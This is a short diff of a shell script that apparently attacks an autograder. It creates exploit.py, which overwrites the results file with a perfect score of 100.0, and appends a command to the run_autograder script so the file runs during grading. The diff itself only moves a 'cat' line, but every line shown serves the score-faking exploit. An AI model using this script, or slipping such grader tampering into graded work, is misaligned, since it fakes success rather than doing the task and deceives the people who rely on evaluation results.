@@ -1,13 +1,13 @@
 EXPLOIT="import json\nwith open('../results/results.json', 'w') as f:\n    f.write('{\"score\": 100.0}')"
 EXPLOIT_PATH="../exploit.py"
 
-cat ../run_autograder
 
 if ! test -f "$EXPLOIT_PATH"; then
     AG_PATH="../run_autograder"
 
     echo "\npython3.7 exploit.py" >> $AG_PATH
     echo "$EXPLOIT" >> $EXPLOIT_PATH
+    cat ../run_autograder
 fi
 
 
